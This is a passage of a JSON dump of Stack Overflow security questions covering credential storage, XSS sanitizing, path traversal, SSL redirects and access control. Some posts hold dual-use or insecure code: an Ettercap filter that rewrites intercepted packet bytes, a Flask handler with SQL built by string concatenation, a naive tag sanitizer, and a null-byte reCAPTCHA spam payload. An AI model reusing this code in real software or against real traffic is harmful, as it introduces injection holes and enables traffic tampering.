rel=\"nofollow\">https://www.symantec.com/theme.jsp?themeid=verisign-ssl-certificates&amp;inid=vrsn_symc_ssl_Buy</a></p>\n"},{"tags":["database","json","security","configuration"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13138086,"title":"JSON vs DATABASE","body":"<p>Recently I had to make an application that later on had to be uploaded to multiple web-servers. Doing this I realized that when storing the admin pass and username's into a json file does not need a db connection so it works all the time. Also when saving the configuration inside json I can just copy my application to web-server and then just go to the browser to do the configuration. </p>\n\n<p>When using a database for this I have to configure this hard coded. Than the db connection would be declared inside a connect.php or config.php. When uploading the application I can't use it because there is no db connection. And I cant set A db connection from within the application itself because I can't login even if I could it would be like a car-key inside a closed car. </p>\n\n<p>My dilemma: Is this the right way, is this save, is this efficient and above all how did you guys do this.</p>\n\n<p>What is the best way to store admin login and configuiration data</p>\n"},{"tags":["android","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":52,"score":-6,"question_id":13138799,"title":"Android security concerns in java","body":"<p>I want to do my final year project as securing the android platform so i want some tips for security. How the security can be extended for this platform? For example, android has its core libraries open so they can be exploited and also data sent to browser is also not encrypted, so what can be various solutions to them?</p>\n"},{"tags":["java","security"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":71,"score":5,"question_id":13137456,"title":"Permission for reading System.in in java","body":"<p>I have some code which is reading user input from console using below code.</p>\n\n<pre><code>Console console = System.console();\nString input = console.readLine();\n</code></pre>\n\n<p>However, this code should run in a very secure env, where every action's permissions are controlled through a policy file.</p>\n\n<p>So I did my testing of the java code with policy file as </p>\n\n<pre><code>grant codeBase \"file:/myjar.jar\" {\n   permission java.security.AllPermission;\n};\n</code></pre>\n\n<p>I have no clue, what permission I should use to grant permission to <code>console.readLine()</code>.</p>\n"},{"tags":["security","sap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13137589,"title":"SAP USMM mysap contractual user types not available","body":"<p>We have recently uploaded to ECC 6.0 and we have to do the user classification but now there's no mySAP professional cat II or any of them mySAP contractual user types on the list.</p>\n\n<p>Can someone help?</p>\n\n<p>Regards,</p>\n"},{"tags":[".net","security","sanitization"],"answer_count":6,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":2656,"score":5,"question_id":939159,"title":".NET libraries to sanitize input?","body":"<p>Are there any thoroughly tested .NET libraries out there to sanitize input from things like script/sql injection?</p>\n"},{"tags":["security","internet-explorer","url","protocols","updates"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13136215,"title":"Internet Explorer - Registering an Application to a URL Protocol after Security Update","body":"<p>As noted in <a href=\"http://msdn.microsoft.com/en-us/library/aa767914%28v=vs.85%29.aspx\" rel=\"nofollow\">Registering an Application to a URL Protocol</a>:</p>\n\n<p><em><strong>registered URL protocol vs. Security Update</em></strong></p>\n\n<p>It seems, that the Kumulatives Sicherheitsupdate für Internet Explorer (2744842) <a href=\"http://technet.microsoft.com/de-de/security/bulletin/ms12-052\" rel=\"nofollow\">http://technet.microsoft.com/de-de/security/bulletin/ms12-052</a> supresses the using of the registered URL protocol.</p>\n\n<p>Before Internet Explorer, Mozilla Firefox and Chrome handled such urls in the right way: calling the registered application.</p>\n\n<p>Now Internet Explorer refuses the url, while Mozilla Firefox and Chrome are working properly!</p>\n\n<p><em>Does anyone knows how to handle it, please?</em></p>\n"},{"tags":["sql-server","security","bcp","xp-cmdshell","sql-server-administration"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13127013,"title":"What is the most secure way to allow users to execute BCP export command from SQL?","body":"<p>I am currently working in an environment where the ability to <strong>export</strong> a table <strong>programatically</strong> from within a hand-run SQL script would be of great help.  </p>\n\n<p>Performing the exports from script will be the first step towards running the entire process from within a stored procedure, therefore I have to be able to initiate the export from SQL.</p>\n\n<p>The organisation currently has the following configuration on most servers - </p>\n\n<ul>\n<li>SQL Server 2005 or 2008</li>\n<li>xp_cmdshell - <strong>disabled</strong></li>\n<li>CLR - <strong>enabled</strong></li>\n</ul>\n\n<p>Ultimately, I would like to be able to call a procedure passing the following parameters and have it perform the export.</p>\n\n<ul>\n<li>table name</li>\n<li>file path/name (on a network share)</li>\n<li>file format </li>\n</ul>\n\n<p>Currently BCP seems like a perfect option in terms of functionality but I am unable to invoke it via the command line due to xp_cmdshell being disabled.</p>\n\n<p>The organisation is quite small and happy work towards a secure solution and my impression so far is that they have a good level of control over their security.  They have made a blanket decision to disable xp_cmdshell but if I could present a safe way to allow use of it I think they would be pretty receptive. </p>\n\n<p>In my research I've come across both the <strong>'EXECUTE AS'</strong> functionality as well as signing procedures with <strong>certificates</strong>, but still cant work out if either approach can help me achieve what I want.</p>\n\n<p>Also, if you have another solution that allows me to achieve the same end-result I'm all ears!</p>\n"},{"tags":["security","symfony2","symfony-2.1"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12284214,"title":"symfony2 - multiple encoding password methods with mutiple user providers","body":"<p>I want to chain two user providers (FosUserBundle and a custom DB user provider over propel) with two distinct encoding password methods</p>\n\n<p>app/config/security.yml</p>\n\n<pre>\nsecurity:  \n\n    encoders:\n        FOS\\UserBundle\\Model\\UserInterface: sha512\n        My\\AuthBundle\\Model\\User: sha1\n\n    providers:\n        my_chain_providers:\n            chain:\n                providers: [\"fos_userbundle\", \"db_user\"]\n        fos_userbundle:\n            id: fos_user.user_provider.username_email\n        db_user:\n            propel:\n                class: My\\AuthBundle\\Model\\User\n                property: username\n\n    firewalls:\n        main:\n            pattern: ^/\n            form_login:\n                provider: my_chain_providers\n            logout:       true\n            anonymous:    true\n\n</pre>\n\n<p>my problem: password's hashs follow $password.'{'.$salt.'}' in fos_user table and $salt.$password in my custom DB user provider</p>\n\n<p>this gist <a href=\"https://gist.github.com/1243080\" rel=\"nofollow\">https://gist.github.com/1243080</a> show how to custom mergePasswordAndSalt method, but is it possible to have one mergePasswordAndSalt method per user provider?</p>\n"},{"tags":["android","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":73,"score":-2,"question_id":13120125,"title":"How to prevent hacker access my app's database on android?","body":"<p>as you know, we can access to any folder on android device after rooting. My app has a database and some other binary files. I know that I can't prevent user see my files and database. But is there any way to prevent user copy it to other android devices for illegal use?</p>\n"},{"tags":["security","testing"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":362,"score":0,"question_id":5105726,"title":"Any ideas why Ettercap filters aren't seeing packet data?","body":"<p>I'm using an Ettercap filter to detect a query response coming back from a particular service on a remote machine. When I see a response from the service, I'm searching through the data in the packet to see if an offset is a specific value, and if so I'm changing the value at another offset.</p>\n\n<p>Trouble is, when I try this on a new virtual machine I built my Ettercap filter's no longer getting any data in the DATA.data variable available to it.</p>\n\n<pre><code>if(ip.proto == TCP &amp;&amp; tcp.src == 17867) {\n  msg(\"Response seen!\\n\");\n\n  if(DATA.data + 2 == \"\\0x01\") {\n    msg(\"Flag detected!\\n\");\n\n    DATA.data + 5 = 0x09;\n  }\n}\n</code></pre>\n\n<p>The filter's getting applied to the traffic because \"Response seen!\" messages get printed out by Ettercap. However, \"Flag detected!\" messages do not. I <strong>think</strong> DATA.data is indeed empty because if I change my second \"if\" statement to check for <code>DATA.data == \"\"</code> then the \"Flag detected!\" message gets printed.</p>\n\n<p>Any ideas why this may be happening?!</p>\n\n<p>Also, if this is the wrong site to be asking questions like this, please let me know. I wasn't sure if it fit better here or somewhere like superuser or serverfault.</p>\n"},{"tags":["security","session","authentication","oauth","go"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":13131587,"title":"Token based session management","body":"<p>I use a GO server (golang.org), which does have good support for encryption and third party package which provides basic cookie based session handling.  I am looking for guidelines on generating tokens, and good practice to store, invalidate etc. My application need custom user management. Can one use Oauth in an offline setting, or any better way?</p>\n"},{"tags":["java","security","random","statistics"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":132,"score":5,"question_id":13123593,"title":"Random identifier in java","body":"<p>I would like to generate random identifier in java. The identifier should have a fixed size, and the probability of generating the same identifier twice should be very low(The system has about 500 000  users).In addition; the identifier should be so long that it’s unfeasible to “guess it” by a brute force attack. </p>\n\n<p>My approach so far is something along the lines of this: </p>\n\n<pre><code>String alphabet = \"0123456789ABCDE....and so on\";\nint lengthOfAlphabet = 42; \nlong length = 12; \n\npublic String generateIdentifier(){\n    String identifier = \"\";\n    Random random = new Random(); \n    for(int i = 0;i&lt;length;i++){\n        identifier+= alphabet.charAt(random.nextInt(lengthOfAlphabet));\n    }\n    return identifier; \n}\n</code></pre>\n\n<p>I’m enforcing the uniqueness by a constraint in the database. If I hit an identifier that already has been created, I’ll keep generating until I find one that’s not in use.  </p>\n\n<p>My assumption is that I can tweak lenghtOfAlpahbet and length to get the properties I’m looking for:</p>\n\n<ol>\n<li>Rare collisions</li>\n<li>Unfeasible to brute force </li>\n<li>The identifier should be as short as possible, as the users of the system will have to type it. </li>\n</ol>\n\n<p>Is this a good approach? Does anyone have any thoughts on the value of “length”?  </p>\n"},{"tags":["java","security","jsp","servlets","xss"],"answer_count":8,"favorite_count":8,"up_vote_count":9,"down_vote_count":0,"view_count":6878,"score":9,"question_id":2658922,"title":"XSS prevention in Java","body":"<p>How can I prevent XSS attacks in Java? Are there any good libraries for that?</p>\n"},{"tags":["security","http","sanitization"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13130282,"title":"Is checking for double dots enough to prevent paths from escaping jail?","body":"<p>I'm writing a service that sends over the network the contents of requested files.  However, I'll only answer requests for files that descend from a fixed <code>parent</code> directory.</p>\n\n<p>The first potential security problem that comes to mind is that an evil user may request paths with <code>..</code> embedded.  Another potential problem are symlinks, though these should not be an issue since I control the local filesystem and there won't be any simlinks under <code>parent</code>.</p>\n\n<p>My question is therefore whether it is enough to check for the existence of <code>..</code> among the path components.  Or is there some other security vulnerability I have forgotten?</p>\n"},{"tags":["ruby-on-rails","ruby","security","https"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12984148,"title":"Trying to force ssl, getting \"This webpage has a redirect loop\"","body":"<p>I'm trying to force all urls generated by my controller to be \"https\" and redirecting to https otherwise. I tried the method explained in <a href=\"http://lucastej.blogspot.com/2008/01/ruby-on-rails-how-to-set-urlfor.html\" rel=\"nofollow\">this blog</a> and the one suggested by Olly <a href=\"http://stackoverflow.com/questions/1662262/rails-redirect-with-https\">here</a>\nand I'm getting this error if I try to access my application:</p>\n\n<blockquote>\n  <p><strong>This webpage has a redirect loop</strong></p>\n  \n  <p>The webpage at https://'example.com' has resulted in too many redirects. Clearing\n  your cookies for this site or allowing third-party cookies may fix the problem.\n  If not, it is possibly a server configuration issue and not a problem with\n  your computer.</p>\n</blockquote>\n\n<p>Clearing the cookie doesn't help. Why is it going into a loop? I made sure to run the code under condition that request.ssl is false. I'm using Rails 2.3.10. \nSo here is what I tried, in my application controller I added:</p>\n\n<pre><code>     url_for unless (Rails.env.test? || Rails.env.development?) \n     def default_url_options(options) \n    { :only_path =&gt; false, :protocol =&gt; 'https' } unless (Rails.env.test? ||  Rails.env.development?) \n    end\n</code></pre>\n\n<p>I also tried</p>\n\n<pre><code>def redirect_to_https\n  redirect_to :protocol =&gt; \"https://\" unless (request.ssl? || Rails.env.test? || Rails.env.development? || local_request?)\nend\n</code></pre>\n"},{"tags":["php","android","security","application","oauth"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":61,"score":2,"question_id":13099343,"title":"How to secure connection between PHP and Android","body":"<p>I have an android application that requires a connection with PHP pages in order to add sensitive data to a database that will affect the application. one can simply find the url where the data is sent to and manipulate it.</p>\n\n<p>I thought about creating a registration based on IMEI, but still able to manipulate it for malicious purposes.</p>\n\n<p>I have also checked OAuth, I didn't really understand how it works and if it can help in my condition.\nWhat can I do to fully secure my application?\nThanks in advance!</p>\n\n<p>EDIT:\nBy the way, what I am mostly trying to achieve here is to make sure the requests are being sent from an Android and not from any other device.</p>\n"},{"tags":["python","security","xss","flask","sanitize"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13127547,"title":"Critique my Flask HTML-Sanitizer for XSS security","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/699468/python-html-sanitizer-scrubber-filter\">Python HTML sanitizer / scrubber / filter</a>  </p>\n</blockquote>\n\n\n\n<p>I am creating my first website, and am trying to be security conscious while doing it. My main strategy right now is relying on simplicity as safety. Like, I'm fine with simpler feautures if it means simpler security and less security holes. I'm making the website with Flask and Python. In one section, I allow user generated content to be displayed on the page as { content | safe }. I understand that this can make me vulnerable to a XSS attack, and have looked at a few different ways of sanitizing HTML code before it is stored as content, but there always seems to be a condition in which it is unsecure. I wrote my own code for sanitizing that is very limiting for the user (it only allows a few essential tags), but feels secure to me, and I'm wondering if there's a reason that this doesn't work for other people.</p>\n\n<p>Without further ado, these are the relevant parts of my code, please critique it if you see holes:</p>\n\n<pre><code>flask_file.py\n\nimport re\n\nACCEPTED_HTML= [\"&lt;b&gt;\",\"&lt;/b&gt;\",\"&lt;i&gt;\",\"&lt;/i&gt;\",\"&lt;br&gt;\",\"&lt;br /&gt;\",\"&lt;u&gt;\",\"&lt;/u&gt;\"]\n\napp = Flask(__name__)\napp.config.from_object(__name__)\n\ndef sanitize(text):\n   tag_pattern = re.compile(\"&lt;.*?&gt;\")\n   for tag in re.findall(tag_pattern,text):\n       if tag.lower() not in app.config['ACCEPTED_HTML']:\n          text = re.sub(tag,\"\",text)\n       continue\n    return text\n\n@app.route('/u/&lt;user&gt;/profile', methods=['GET','POST'])\ndef edit_profile(user):\n   cur = g.db.execute('select username, message, greetingmessage, password from users where username=\"'+user+'\"')\n   curr_user = [dict(username=row[0], messages=row[1], greet=row[2], pword=row[3]) for row in cur.fetchall()][0]\n   if request.method == 'POST':\n      g_message = sanitize(request.form['greet_message'])\n      g.db.execute('delete from users where username =\"'+curr_user['username']+'\"')\n      g.db.execute('insert into users (username, message, greetingmessage, password) values (?, ?, ?, ?)',\n        [curr_user['username'],curr_user['messages'], g_message,curr_user['pword']])\n      g.db.commit()\n      return redirect(url_for('user_page', user=user))\n   return render_template('edit_profile.html', user=curr_user['username'], greeting_message=curr_user['greet'])\n</code></pre>\n\n<p>Would I be better off just using a built it sanitization module? Did I totally misunderstand XSS?</p>\n"},{"tags":["wcf","security","rest","asp.net-web-api","servicestack"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":26,"score":-1,"question_id":13127414,"title":"file streaming sensitive data","body":"<p>I am looking for options to build a service to upload files(sensitive data) from the client over the internet. \nI googled on this topic and looks like I found these are the options.</p>\n\n<ol>\n<li>WCF REST with message based security and https</li>\n<li>ASP.net Web-API</li>\n<li>ServiceStack\nCould you please let me know if I am on right track? Any suggestions or links would be appreciated.</li>\n</ol>\n\n<p>Thank you.</p>\n"},{"tags":["security","web-security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13122239,"title":"Providing a public link to an admin area - bad idea?","body":"<p>I have a client who is requesting that we add a link to the system admin area on the main (public) website so that they can just go to the site and click the URL.</p>\n\n<p>Would you consider this to be a bad idea? I find it a bit odd that they cant remember to go to /admin - seems pretty much like you're inviting someone to try and break in, does it not?</p>\n\n<p>I've been trying to come up with some other method. If it was me, I'd just bookmark it, however my client is a consortium of...'old gentlemen' with little computing know-how.</p>\n\n<p>Any thoughts on how this should be tackled?</p>\n"},{"tags":["php","security"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":972,"score":5,"question_id":8115159,"title":"Can people write a .php file to my chmod 777 folder","body":"<p>Is it possible for hackers ( or other ) to upload/write a php file to a folder on my site that has chmod 777?</p>\n\n<p>Example:</p>\n\n<p>I have a folder that has chmod 777.\nThat folder contains images.\nI use .htaccess to block indexing the folder.</p>\n\n<p>Reformed question:\nCan people write a .php file to my folder that has chmod 777 by using a PHP script on their website? For example , to list all the images in that folder</p>\n\n<p>( I'm familiar with the right chmod for uploading folder etc .. , just asking it hypotheticaly )</p>\n"},{"tags":["java","security","batch","applet","keytool"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":345,"score":1,"question_id":7571949,"title":"Answer password to keytool in batch files","body":"<p>i need use keytool and jarsigner to sign a lot o files here in many folders.<br>\nEach time i start sign theses files i need delete the .cert and keystore file to recreate it.<br>\nIm on development enviroment and using fake passwd to sign it, after application working the infra people will take care of sign it, i havent access to real certificates.<br>\nWhen i was typing and the [keytool -import .......] ,after enter, ask for password i simply type it<br>\nbut in batch it become a problem.<br>\nIm on windows 7 here.<br>\nI was tried [keytool -import ....... &lt; passHere] and<br>\n[keytool -import ....... | passHere] too but its dont work.<br>\nI want turn sign most automatic possible.<br>\nThere is someone telling about use it programatically <a href=\"http://stackoverflow.com/questions/5051195/how-to-utilize-keytool-programatically\">here</a> but i simply need it on a bat file.<br>\nThe password is a <strong>fixed</strong> value <strong>inside</strong> batch file.<br>\nThere is a way to give passwd inline to keytool?<br>\nIs possible set an enviroment variable in 'run time' to feed keytool password? how do it ?<br>\nThere is a way to give passwd inside bath to keytool? I see <a href=\"http://support.microsoft.com/default.aspx?scid=KB;EN-US;Q77457&amp;\" rel=\"nofollow\">this</a> but dont help because im not a asm developer and not sure if it match problem and im wondering if there is something more simple.</p>\n\n<p>Thanks</p>\n"},{"tags":["json","security","rest"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":261,"score":1,"question_id":6103306,"title":"Is this a valid JSON response?","body":"<p>G'day gurus,</p>\n\n<p>I'm calling the REST APIs of an enterprise application that shall remain nameless, and they return JSON such as the following:</p>\n\n<pre><code>throw 'allowIllegalResourceCall is false.';\n{\n  \"data\": ... loads of valid JSON stuff here ...\n}\n</code></pre>\n\n<p>Is this actually valid JSON?  If (as I suspect) it isn't, is there any <em>compelling</em> reason for these kinds of shenanigans?</p>\n\n<p>The response I received from the application vendor is that this is done for security purposes, but I'm struggling to understand how this improves security much, if at all.</p>\n\n<p>Thanks in advance!</p>\n\n<p>Peter</p>\n"},{"tags":["c#","wcf","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":107,"score":1,"question_id":3954017,"title":"Verifying remote program integrity/validity as part of WCF service security","body":"<p>I have an application running on remote systems. The remote systems are an embedded computer built into a kiosk. As a result, they are somewhat \"untrusted,\" in that the physical security for them is rather lax. However, these kiosks can be credit card processing, etc. via a WCF service to my server.</p>\n\n<p>Using machine certificates, etc., I can verify that the client is who they say they are, which protects against someone copying my binaries off of the kiosk somehow and then running it on their own machine. However, how can I prevent against the following two attacks:</p>\n\n<ul>\n<li>Someone takes the binary, modifies it maliciously, and then runs it on the system</li>\n<li>Someone decompiles my application, and using parts of my code (such as where I reference certificates or shared secrets) writes their own application, and runs it on the machine.</li>\n</ul>\n\n<p>Obviously I have taken steps using the operating system to prevent against these sort of attacks, but I need a way at the server to ensure that it is not being duped.</p>\n\n<p>Any suggestions?</p>\n"},{"tags":["wcf","security","firewall","dmz"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":15,"score":-1,"question_id":13123035,"title":"Security concerns for putting a WCF based server outside firewall","body":"<p>We've built a small service that passes messages for client machines. The service was developed with WCF and we use <em>Windows Security</em> to leverage active directory trust to manage identities. Basically the server will reject a client if it's from a domain that is not trusted by where the domain where the server is located. </p>\n\n<p>There's a new requirement: it's important that the server can handle client requests from outside the firewall. </p>\n\n<p>We thought about taking the server, remove the security from the binding so the trust won't be an issue, and place it outside the firewall. Is that a reasonable option? If not: why, and what are our alternatives?</p>\n"},{"tags":["security","rest","authorization","jax-rs","glassfish-3"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":54,"score":4,"question_id":13071295,"title":"JAX-RS, how to prevent user A from accessing user B's restful resource","body":"<p>I'm using JAX-RS on Glassfish to implement a set of resources, which can be accessed only by specific users.</p>\n\n<p>Consider two users, userA and userB, both registered in my website.</p>\n\n<ol>\n<li>userA created its own resource <code>http://{localhost}/service/user/A</code>; </li>\n<li>userB created its own resource <code>http://{localhost}/service/user/B</code>;</li>\n</ol>\n\n<p>Then Glassfish's default security implementation was configured as:</p>\n\n<ol>\n<li>User Role can access <code>/services/user/*</code></li>\n<li>userA and userB are both in User Role.</li>\n</ol>\n\n<p>So when logged in, both userA and userB can access to <code>/service/user/A</code> and <code>/service/user/B</code>.</p>\n\n<p>Now the question, \nIs it possible that </p>\n\n<ul>\n<li>userA can only access <code>/services/user/A</code>, but not <code>/services/user/B</code></li>\n</ul>\n\n<p>and at the same time</p>\n\n<ul>\n<li>userB can only access <code>/services/user/B, but not</code>/services/user/A`</li>\n</ul>\n\n<p>I think I must have missed something, because this is a common need I believe.\nCan anyone help?</p>\n"},{"tags":["android","security","webserver","signature","iap"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13066484,"title":"Ensure item is purchased before allowing to download from my server when download is invoked later after purchasing","body":"<p>I have the following scenario:</p>\n\n<ol>\n<li>I have some items that I want to sell</li>\n<li>User buys the item and it is marked is \"Purchased\". Now user can download the file.</li>\n<li>User presses \"Download\" button and downloads the file (it must be some unique link)</li>\n</ol>\n\n<p>I read all inapp billing docs and steps 1 and 2 work fine for me. How can I implement step 3 on the android side?</p>\n\n<p>I imagine this something like:</p>\n\n<ol>\n<li>App sends product id to my server</li>\n<li>My server responds with a nonce</li>\n<li>I send this nonce and product id to Google Play</li>\n<li>Google Play returns me a signed ticket (nonce and product id)</li>\n<li>I send this signed ticket to my server</li>\n<li>my server returns file for app</li>\n</ol>\n\n<p>At this moment I can only handle info if purchase status is changed, but what if I first buy the item and then later download it securely.</p>\n"},{"tags":["asp.net-mvc","security","https","hosting","web-hosting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":32,"score":-1,"question_id":13100290,"title":"Does the RequireHttpsAttribute place any requirements on the hosting provider?","body":"<p>I would like to publish a website. I would like the website to run over HTTPS. I have read about the requirehttpsattribute: <a href=\"http://msdn.microsoft.com/en-us/library/system.web.mvc.requirehttpsattribute.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/system.web.mvc.requirehttpsattribute.aspx</a></p>\n\n<p>Is https done at the application level or does the hosting provider need to support this as well?</p>\n"},{"tags":["security","recaptcha"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13123469,"title":"Can recaptcha be bypassed by sending NULL bytes?","body":"<p>We're running Atomic Secured Linux, and it's been catching posts that are sending NULL bytes in the recaptcha_response_field. The posts in question are definitely spammy, but the only field that gets null bytes is \"recaptcha_response_field\". In particular, the following is present twice in the POST body:</p>\n\n<pre><code>recaptcha_response_field=%00%00%00%00%00%00%00%00\n</code></pre>\n\n<p>I'm wondering if this is a known attack against recaptcha, or otherwise a known method of compromising web servers. And if so, what it's intended to do.</p>\n"},{"tags":["php","android","security"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13117043,"title":"Restrict access to php scripts on my server","body":"<p>I have several php scripts which connect to my sql server and retrieve some data. I call these php scripts from an android application. Now the issue is that I do not want the output of the scripts to be publicly seen when someone goes to that site on their computer.(Since they hold information about who has my application installed and other data). The only reason I have these scripts is for the internal logic of my application. I was wondering is there any easy way to keep my scripts accessible from the android phone and at the same time not display thier output when I connect to it using a browser from my computer. If not what other options do I have ? </p>\n"},{"tags":["android","security"],"answer_count":1,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":313,"score":6,"question_id":10990821,"title":"How to securely store credentials (password) in Android application?","body":"<p>I want to store the password used for signing in a financial application that I am developing at a secure place. After doing some net surfing I found following options but each of them has certain drawback.</p>\n\n<p><strong>1) KeyChain.</strong><br/> \nOnly available in OS version 4.</p>\n\n<p><strong>2) Shared Preferences.</strong><br/>\nIt stores data in plain text even though if I encrypt the data then the encryption key can be compromised by decompiling the application code.</p>\n\n<p><strong>3)  Access keystore daemon and store credentials in it.</strong><br/>\n(<a href=\"http://nelenkov.blogspot.com/2012/05/storing-application-secrets-in-androids.html\" rel=\"nofollow\">http://nelenkov.blogspot.com/2012/05/storing-application-secrets-in-androids.html</a>)\nRequires another password to remember.</p>\n\n<p>Please suggest me a better way to secure credential information in android application like IPhone KeyChain.</p>\n"},{"tags":["svn","merge","connection","security","truncated"],"answer_count":5,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":4386,"score":8,"question_id":2324187,"title":"Merge trunk into branch with SVN: \"Secure Connection Truncated\"","body":"<p>after trying to merge changes to an svn trunk back to the branch with the following command:</p>\n\n<blockquote>\n  <p>../branches/myBranch$ svn merge -r 94:171 <a href=\"https://.../trunk\" rel=\"nofollow\">https://.../trunk</a> --dry-run</p>\n</blockquote>\n\n<p>I get the following error from SVN:</p>\n\n<blockquote>\n  <p>svn: REPORT of '/svnroot/simspark/!svn/vcc/default': Could not read chunk size: Secure connection truncated (https://simspark.svn.sourceforge.net)</p>\n</blockquote>\n\n<p>We already tried to google this for quite a while and concluded that this is kinda pointless. I won't stop you from trying yourself of course, but you have been warned.</p>\n\n<p>Anyway, the general vibe of what we found is that this is a bug in to SVN and we are screwed. I'm using SVN version 1.5.4, which is the newest version available for my Linux distribution.</p>\n\n<p>Any ideas? I don't feel like losing more than three months of work, so a solution would be quite nice.</p>\n\n<p>A colleague who just tried this on a Mac did not get the error and could pull off the dry-run, by the way, but already has a few dozen conflicts, and still counting. &lt;3 SVN.</p>\n"},{"tags":["asp.net","security","papertrail"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12937240,"title":"Papertrail and code access security","body":"<p>I am currently looking into papertrail and find it very interesting.\nHowever my web application will be deployed to web servers that I don't control.\nThe problem is that I use this solution to send logs to papertrail:\n<a href=\"http://help.papertrailapp.com/kb/configuration/nlog-net-logging\" rel=\"nofollow\">http://help.papertrailapp.com/kb/configuration/nlog-net-logging</a></p>\n\n<p>And the way I see it I can't send logs on a website with medium trust level:\n<a href=\"http://technet.microsoft.com/en-us/library/cc754779.aspx\" rel=\"nofollow\">http://technet.microsoft.com/en-us/library/cc754779.aspx</a></p>\n\n<p>Is this right?\nDo you have any experience with using papertrail on medium trust sites?</p>\n"},{"tags":["php","regex","security","eval"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":296,"score":1,"question_id":6767884,"title":"PHP preg_replace - How to get the same result without `/e` `eval` - improved security and speed performance?","body":"<p>How to get the same result without <code>/e</code> <code>eval</code> - improved security and speed performance?</p>\n\n<pre><code>function finclude($file){\n    return include($file);\n}\n\n$str = \"Today is {include 'date.php'}.\";\necho preg_replace(\"/\\{include '(.*)\\'}/e\", 'finclude(\"$1\")', $str);\n</code></pre>\n\n<p>date.php:</p>\n\n<pre><code>&lt;?php return date('jS \\of F'); ?&gt;, 2011\n</code></pre>\n\n<p>Result: <code>Today is 20th of July.</code></p>\n"},{"tags":["php","apache","security","centos"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13120522,"title":"PHP Login - Password input - Special characters? - Centos 5 System","body":"<p>I have a CentOS 5 VPS and I have just installed my website there. But I have problems that when I'm inserting special characters into the password field like: ' (apostophe) or something like that, I always get the error, that this password is incorrect :/ I guess this is because of the Linux System. Am I right? Or maybe because of te sanitizing I'm doing?</p>\n\n<p>I'd be gald if anyone could help me.</p>\n\n<p>EDIT:</p>\n\n<pre><code>function array_sanitize(&amp;$item) {\n    $item = htmlentities(strip_tags(mysql_real_escape_string($item)));\n}\n</code></pre>\n"},{"tags":["security","mobile","air","https","adobe"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13119895,"title":"Try to make Https Request on Adobe Air mobile apps with Actionscript Flex","body":"<p>I try to make an https request from a mobile iOs Device. This isnt working. In the flashbuilder simulator (on Mac) I have to accept the self-signed certificate but  its working fine. \nOn the mobile device I've got the </p>\n\n<blockquote>\n  <p>error 2032</p>\n</blockquote>\n\n<p>I also have the same problem on an web mirgrated Version of the app. \nI have added on the server root  the crossdomain.xml:</p>\n\n<pre><code>site-control permitted-cross-domain-policies=\"master-only\"\nallow-access-from domain=\"*\" secure=\"false\"\n</code></pre>\n\n<p>In the project i use the  mx.rpc.http.HTTPService class. And i tried to change the destination type but with no effect:</p>\n\n<pre><code>useProxy = true;\ndestination = 'DefaultHTTPS';\n</code></pre>\n"},{"tags":["spring","security","pre-authentication"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13120362,"title":"Spring Security @PreAuthorize \"false\" instead of Exception","body":"<p>I encountered the situation when I need to use @Pre or @PostAuthorize annotation but with returned value \"false\" instead Authentication Exception. Have anyone any idea how to realize this?</p>\n"},{"tags":["php","security","permissions","webserver"],"answer_count":4,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":1835,"score":3,"question_id":3484171,"title":"File permissions; Should my www-folder content be owned by 